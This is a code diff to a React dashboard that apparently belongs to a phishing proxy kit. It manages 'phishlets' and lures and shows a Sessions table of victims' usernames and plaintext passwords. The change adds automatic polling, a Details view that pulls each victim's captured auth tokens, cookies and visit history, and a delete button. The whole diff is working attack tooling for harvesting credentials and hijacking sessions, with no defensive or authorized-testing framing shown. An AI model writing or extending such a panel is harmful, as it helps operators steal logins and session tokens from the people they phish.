@@ -2,6 +2,9 @@ import React, { useEffect, useRef, useState } from 'react';
 import { Link } from 'react-router-dom';
 import { api, getPassword } from '../lib/api.js';
 import Info from '../components/Info.jsx';
+import SessionDetail from '../components/SessionDetail.jsx';
+
+const POLL_MS = 5000;
 
 export default function Dashboard() {
   const [phishlets, setPhishlets] = useState([]);
@@ -10,6 +13,7 @@ export default function Dashboard() {
   const [error, setError] = useState('');
   const [busyName, setBusyName] = useState('');
   const [uploading, setUploading] = useState(false);
+  const [detail, setDetail] = useState(null);
   const fileInputRef = useRef(null);
 
   function refresh() {
@@ -18,7 +22,27 @@ export default function Dashboard() {
     api.get('/api/sessions').then((d) => setSessions(d.rows)).catch(() => {});
   }
 
-  useEffect(refresh, []);
+  useEffect(() => {
+    refresh();
+    const id = setInterval(refresh, POLL_MS);
+    return () => clearInterval(id);
+  }, []);
+
+  async function viewSession(id) {
+    try {
+      const res = await api.get(`/api/sessions/${id}`);
+      setDetail({ id, raw: res.raw, cookies: res.cookies });
+    } catch (e) {
+      setError(e.message);
+    }
+  }
+
+  async function deleteSession(id) {
+    if (!confirm(`Delete session ${id}?`)) return;
+    await api.del(`/api/sessions/${id}`);
+    if (detail?.id === id) setDetail(null);
+    refresh();
+  }
 
   async function uploadFile(e) {
     const file = e.target.files?.[0];
@@ -148,15 +172,22 @@ export default function Dashboard() {
       </div>
 
       <div className="card">
-        <h2>Sessions <Info text="A session is created whenever a visitor completes a lure — this is where captured credentials and auth tokens show up." /></h2>
+        <h2>Sessions <Info text="A session is created whenever a visitor completes a lure — this is where captured credentials and auth tokens show up. Updates automatically every few seconds." /></h2>
+        {detail && <SessionDetail {...detail} />}
         <div className="table-scroll">
           <table>
-            <thead><tr><th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th></tr></thead>
+            <thead><tr><th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th></th></tr></thead>
             <tbody>
               {sessions.map((s, i) => (
-                <tr key={i}><td>{s.id}</td><td>{s.phishlet}</td><td>{s.username}</td><td>{s.password}</td></tr>
+                <tr key={i}>
+                  <td>{s.id}</td><td>{s.phishlet}</td><td>{s.username}</td><td>{s.password}</td>
+                  <td className="row">
+                    <button onClick={() => viewSession(s.id)} title="Show captured auth tokens and full visit history">Details</button>
+                    <button className="danger" onClick={() => deleteSession(s.id)}>Delete</button>
+                  </td>
+                </tr>
               ))}
-              {sessions.length === 0 && <tr><td colSpan={4} className="dim">No sessions captured yet.</td></tr>}
+              {sessions.length === 0 && <tr><td colSpan={5} className="dim">No sessions captured yet.</td></tr>}
             </tbody>
           </table>
         </div>
